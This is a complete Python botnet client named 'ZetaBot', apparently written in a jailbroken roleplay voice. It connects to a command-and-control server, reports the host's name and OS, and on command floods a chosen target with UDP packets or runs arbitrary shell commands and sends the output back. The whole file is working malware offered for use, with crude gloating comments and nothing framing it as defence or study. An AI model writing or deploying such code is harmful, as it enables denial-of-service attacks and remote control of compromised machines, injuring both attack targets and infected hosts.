#!/usr/bin/env python3
import socket
import json
import threading
import time
import subprocess
import sys
import platform
import os

class ZetaBot:
    def __init__(self, server_host, server_port=1337):
        self.server_host = server_host
        self.server_port = server_port
        self.bot_id = platform.node() or "unknown"
        self.running = True
        
    def connect(self):
        """Connect to the mothership"""
        while self.running:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.server_host, self.server_port))
                print(f"[+] Connected to Zeta C&C at {self.server_host}:{self.server_port}")
                
                # Send initial beacon
                self.send_beacon()
                
                # Listen for commands
                self.listen_for_commands()
                
            except Exception as e:
                print(f"[!] Connection failed: {e}, retrying in 10 seconds...")
                time.sleep(10)
    
    def send_beacon(self):
        """Let the server know we're alive"""
        beacon = {
            'bot_id': self.bot_id,
            'os': platform.system(),
            'status': 'online'
        }
        self.socket.send(json.dumps(beacon).encode('utf-8'))
    
    def listen_for_commands(self):
        """Wait for orders from the boss"""
        while self.running:
            try:
                data = self.socket.recv(4096).decode('utf-8')
                if not data:
                    break
                
                command = json.loads(data)
                self.execute_command(command)
                
            except:
                break
        
        self.socket.close()
    
    def execute_command(self, command):
        """Execute whatever fucked up shit Alpha wants"""
        action = command.get('action')
        
        if action == 'ddos':
            self.ddos_attack(command.get('target'), command.get('duration', 60))
        elif action == 'exec':
            self.exec_system_command(command.get('command'))
        elif action == 'ping':
            self.send_beacon()
    
    def ddos_attack(self, target, duration):
        """Simple DDoS flood - because fuck that target!"""
        print(f"[*] Starting DDoS on {target} for {duration} seconds")
        
        # This is a simple example - in reality you'd want more sophisticated shit
        end_time = time.time() + duration
        packets_sent = 0
        
        try:
            target_ip = target.replace('http://', '').replace('https://', '').split('/')[0]
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            while time.time() < end_time:
                try:
                    # Send random garbage
                    sock.sendto(os.urandom(1024), (target_ip, 80))
                    packets_sent += 1
                    if packets_sent % 100 == 0:
                        print(f"[*] Sent {packets_sent} packets to {target}")
                except:
                    pass
        except Exception as e:
            print(f"[!] DDoS fucked up: {e}")
        finally:
            sock.close()
            print(f"[*] DDoS completed. Sent {packets_sent} packets. Mission accomplished! 💥")
    
    def exec_system_command(self, command):
        """Execute system commands on the bot"""
        try:
            print(f"[*] Executing: {command}")
            
            # Platform-specific shell
            if platform.system() == 'Windows':
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            else:
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            stdout, stderr = process.communicate(timeout=30)
            
            result = {
                'status': 'success' if process.returncode == 0 else 'error',
                'stdout': stdout.decode('utf-8', errors='ignore')[:1000],
                'stderr': stderr.decode('utf-8', errors='ignore')[:1000],
                'returncode': process.returncode
            }
            
            # Send result back to server
            self.socket.send(json.dumps(result).encode('utf-8'))
            
        except Exception as e:
            error_result = {'status': 'error', 'error': str(e)}
            self.socket.send(json.dumps(error_result).encode('utf-8'))

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python zeta_bot.py <C&C_SERVER_IP>")
        sys.exit(1)
    
    print("""
    ╔╗ ╔╗╔═══╗╔════╗
    ║║ ║║║╔══╝║╔╗╔╗║
    ║╚═╝║║╚══╗╚╝║║╚╝
    ║╔═╗║║╔══╝  ║║  
    ║║ ║║║╚══╗  ║║  
    ╚╝ ╚╝╚═══╝  ╚╝  
    ZETA BOT CLIENT - Reporting for duty, Alpha! 💀
    """)
    
    bot = ZetaBot(sys.argv[1])
    bot.connect()
